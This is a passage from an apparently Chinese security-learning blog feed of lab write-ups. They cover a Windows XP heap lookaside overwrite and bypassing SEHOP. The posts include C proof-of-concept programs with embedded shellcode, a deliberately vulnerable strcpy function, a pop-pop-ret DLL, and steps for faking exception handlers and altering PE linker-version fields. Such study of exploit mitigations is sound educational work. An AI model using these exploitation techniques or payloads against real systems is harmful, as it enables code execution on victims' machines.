class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> shellcode []=</span><br><span class="line">    <span class="string">&quot;\xEB\x40\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\x03\00\x03\x00\x5C\x01\x08\x99&quot;</span><span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\xE4\xFF\x12\x00&quot;</span><span class="comment">//用默认异常处理函数指针所在位置覆盖</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line">    HLOCAL h1,h2,h3;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">    HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">    <span class="built_in">memcpy</span>(h1,shellcode,<span class="number">300</span>);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(h3,<span class="string">&quot;\x90\x1E\x39\x00&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,zero);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路-2"><a class="markdownIt-Anchor" href="#实验思路-2"></a> 实验思路</h2><p>（1）首先申请 3 块 16 字节的空间，然后将其释放到快表中，以便下次申请空间时可以从快表中分配。<br>（2）通过向 h1 中复制超长字符串来覆盖 h2 块首中下一堆块的指针。<br>（3）用户申请空间时我们伪造的下一堆块地址就会被赋值给 Lookaside[2]-&gt;next，当用户再次申请空间时系统就会将我们伪造的地址作为用户申请空间的起始地址返回给用户。<br>（4）当我们将这个地址设置为异常处理函数指针所在位置时就可以伪造异常处理函数了。<br>（5）通过制造除 0 异常，让程序转入异常处理，进而劫持程序流程，让程序转入 shellcode 执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP Pro SP2</td></tr><tr><td>编译环境</td><td>VC++ 6.0</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><blockquote><p>说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。</p><p>注意：此实验在常态堆下进行，注意不要用调试态。</p></blockquote><p>直接编译运行程序，在弹出的对话框中单击“调试”，进入OD调试。分析程序在执行完两次释放操作后内存状态，记下 h1、 h2 和 h3 的值，这个值大家可以通过每次执行完 HeapAlloc 的 EAX 获得，本次实验中 3 个地址分别为：0x00391E90、 0x00391EA8 和 0x00391EC0。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706090816776.png" alt="image-20220706090816776"></p><p>确定填充字符串的长度和异常处理函数指针所在位置。h1 中数据部分起始地址为 0x00391E90，而 h2 中下一堆块指针位于 0x00391EA8，所以只需要向 h1 中复制超过 28 个字节的字符就可以覆盖掉 h2 中下一堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x03\00\x03\x00\x44\x01\x08\x00&quot;</span> <span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\xE4\xFF\x12\x00&quot;</span> <span class="comment">//用默认异常处理函数指针所在位置覆盖</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>将程序运行到覆盖掉块首后第一次申请空间结束时，然后转到快表索引部分附近（0x00390688）。如下图，Lookaside[2] 中的下一块首地址已经被修改为 0x0012FEE4。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706081836917.png" alt="image-20220706081836917"></p><p>继续单步运行到再次申请空间结束时，通过 EAX 可以看到程序申请到的空间起始地址确实为 0x0012FFE4，如下图所示。<img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706083450264.png" alt="image-20220706083450264"></p><p>只要向这个刚申请的空间里写入 shellcode 的起始地址就能跳转运行 shellcode。为了演示方便，将弹出对话框的机器码放置在 h1 中，这样只需要在 0x0012FFE4 中写入 h1 的起始地址就可以在程序发生异常的时候劫持程序流程了。</p><p>shellcode 的布局<br><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706085438047.png" alt="image-20220706085438047"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode []=</span><br><span class="line"><span class="string">&quot;\xEB\x40\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x03\00\x03\x00\x44\x01\x08\x00&quot;</span> <span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\xE4\xFF\x12\x00&quot;</span> <span class="comment">//用默认异常处理函数指针所在位置覆盖</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91 \x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>按照上面的 shellcode 布局，去掉 INT 3 指令，重新编译运行。弹出异常对话框，直接单击 ”调试“ 就能看到对话框了。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706123029305.png" alt="image-20220706123029305"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;堆保护机制的原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#堆保护机制的原理&quot;&gt;&lt;/a&gt; 堆保护机制的原理&lt;/h1&gt;
&lt;p&gt;堆中的安全校验操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**PEB random：**在 W</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="堆" scheme="https://www.rgzzplus.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>S.E.H 终极防护：SEHOP</title>
    <link href="https://www.rgzzplus.com/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/"/>
    <id>https://www.rgzzplus.com/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/</id>
    <published>2022-06-28T10:03:37.000Z</published>
    <updated>2022-08-01T11:20:08.718Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="sehop-的原理"><a class="markdownIt-Anchor" href="#sehop-的原理"></a> SEHOP 的原理</h1><p>SEHOP（Structured Exception Handling Overwrite Protection），它在 Windows Server 2008 默认启用，而在 Windows Vista 和 Windows 7 中 SEHOP 默认是关闭的。</p><h2 id="启用-sehop-有以下两种方式"><a class="markdownIt-Anchor" href="#启用-sehop-有以下两种方式"></a> 启用 SEHOP 有以下两种方式：</h2><p>（ 1）下载 <a href="http://go.microsoft.com/?linkid=9646972">http://go.microsoft.com/?linkid=9646972</a> 的补丁，此补丁适用于 Windows 7 和 Windows Vista SP1。<br>（ 2）在注册表中 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel 下面找到 DisableExceptionChainValidation 项， 将该值设置为 0，即可启用 SEHOP。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628135200328.png" alt="image-20220628135200328"></p><p>程序中的各 S.E.H 函数是以单链表的形式存放于栈中的，而在这个链表的末端是程序的默认异常处理，它负责处理前面 S.E.H 函数都不能处理的异常。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628135450912.png" alt="image-20220628135450912"></p><p>SEHOP 的核心任务是检查这条 S.E.H 链的完整性，在程序转入异常处理前 SEHOP 会检查 S.E.H 链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果不是，则不会执行当前异常处理函数。</p><p>其验证代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (process_flags &amp; <span class="number">0x40</span> == <span class="number">0</span>) &#123; <span class="comment">//如果没有 SEH 记录则不进行检测</span></span><br><span class="line">    <span class="keyword">if</span> (record != <span class="number">0xFFFFFFFF</span>) &#123; <span class="comment">//开始检测</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (record &lt; stack_bottom || record &gt; stack_top)<span class="comment">// SEH 记录必须位于栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">char</span>*)record + <span class="keyword">sizeof</span>(EXCEPTION_REGISTRATION) &gt; stack_top)</span><br><span class="line">            <span class="comment">//SEH 记录结构需完全在栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((record &amp; <span class="number">3</span>) != <span class="number">0</span>) <span class="comment">//SEH 记录必须 4 字节对齐</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            handler = record-&gt;handler;</span><br><span class="line">            <span class="keyword">if</span> (handler &gt;= stack_bottom &amp;&amp; handler &lt; stack_top)</span><br><span class="line">            <span class="comment">//异常处理函数地址不能位于栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            record = record-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">while</span> (record != <span class="number">0xFFFFFFFF</span>); <span class="comment">//遍历 S.E.H 链</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((TEB-&gt;word_at_offset_0xFCA &amp; <span class="number">0x200</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (handler != &amp;FinalExceptionHandler)<span class="comment">//核心检测，地球人都知道，不解释了</span></span><br><span class="line">                <span class="keyword">goto</span> corruption;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628140148529.png" alt="image-20220628140148529"></p><p>攻击时，将 S.E.H 结构中的异常处理函数地址覆盖为跳板指令地址，跳板指令根据实际情况进行选择。当程序出现异常的时候，系统会从 S.E.H 链中取出异常处理函数来处理异常，异常处理函数的指针已经被覆盖，程序的流程就会被劫持，在经过一系列跳转后转入 shellcode 执行。由于覆盖异常处理函数指针时同时覆盖了指向下一异常处理结构的指针，这样的话 S.E.H 链就会被破坏，从而被 SEHOP 机制检测出。</p><p>SEHOP 检查是在 SafeSEH 的 RtlIsValidHandler 函数校验前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用 SafeSEH 模块的方法都行不通了，必须要考虑其他的出路。理论上我们还有三种方法：<br>（ 1）不去攻击 S.E.H，而是攻击函数返回地址或者虚函数等。<br>（ 2）利用未启用 SEHOP 的模块。<br>（ 3）伪造 S.E.H 链</p><h1 id="攻击返回地址"><a class="markdownIt-Anchor" href="#攻击返回地址"></a> 攻击返回地址</h1><p>这种方法需要一定的运气。如果您能够碰到一个程序，他启用了 SEHOP 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护，什么都不要多说了，直接攻击函数返回地址。</p><h2 id="攻击虚函数"><a class="markdownIt-Anchor" href="#攻击虚函数"></a> 攻击虚函数</h2><p>无论 SEHOP 有多么的强大，它保护的也只是 S.E.H，对于 S.E.H 以外的东西是不提供保护的。所以我们依然可以通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理。之前我们做过，在此就不过多介绍了。</p><h1 id="利用未启用-sehop-的模块"><a class="markdownIt-Anchor" href="#利用未启用-sehop-的模块"></a> 利用未启用 SEHOP 的模块</h1><p>在程序的编译属性里没有提供禁用 SEHOP 这个选项，但是出于兼容性的考虑还是对一些程序禁用了 SEHOP，如经过 Armadilo 加壳的软件。</p><p>操作系统会根据 PE 头中 MajorLinkerVersion 和 MinorLinkerVersion 两个选项来判断是否为程序禁用 SEHOP。可以将这两个选项分别设置为 0x53 和 0x52 来模拟经过 Armadilo 加壳的程序，从而达到禁用 SEHOP 的目的。</p><p>禁用 SEHOP 后，还需要搞定 SafeSEH，所以我们在 “利用未启用 SafeSEH 模块” 实验基础上完成演示。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 7</td><td></td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>系统 SEHOP</td><td>启用</td><td></td></tr><tr><td>程序 DEP</td><td>关闭</td><td></td></tr><tr><td>程序 ASLR</td><td>EXE 随意， DLL 禁用</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h2><h3 id="编译一个不启用-safeseh-的-dll"><a class="markdownIt-Anchor" href="#编译一个不启用-safeseh-的-dll"></a> 编译一个不启用 SafeSEH 的 DLL。</h3><p>我们在《亡羊补牢：SafeSEH》中介绍过，这里就不过多赘述，直接放出源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">jump</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">    pop eax</span><br><span class="line">    pop eax</span><br><span class="line">    retn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(str,input);</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(MyException())</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="为-seh_nosaeseh_jumpdll-禁-用-sehop"><a class="markdownIt-Anchor" href="#为-seh_nosaeseh_jumpdll-禁-用-sehop"></a> 为 SEH_NOSaeSEH_JUMP.dll 禁 用 SEHOP</h3><p>用 CFF Explorer 打开 SEH_NOSaeSEH_JUMP.dll 后在 Optional header 选项页中来进行设置，分别将 MajorLinkerVersion 和MinorLinkerVersion 设置为 0x53 和 0x52。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628122629316.png" alt="image-20220628122629316"></p><h3 id="对主程序进行一定的修改"><a class="markdownIt-Anchor" href="#对主程序进行一定的修改"></a> 对主程序进行一定的修改</h3><p>（1）修改弹出对话框的 shellcode，让其可以在 windows 7下正常弹出。</p><p>windows xp下的SafeSEH<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628133422937.png" alt="windows xp下的SafeSEH"></p><p>windows 7下的SafeSEH<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628133204357.png" alt="windows 7下的SafeSEH"></p><p>由于在 Windows 7 下 PEB_LDR_DATA 指向加载模块列表中第二个模块位置被 KERNELBASE.dll 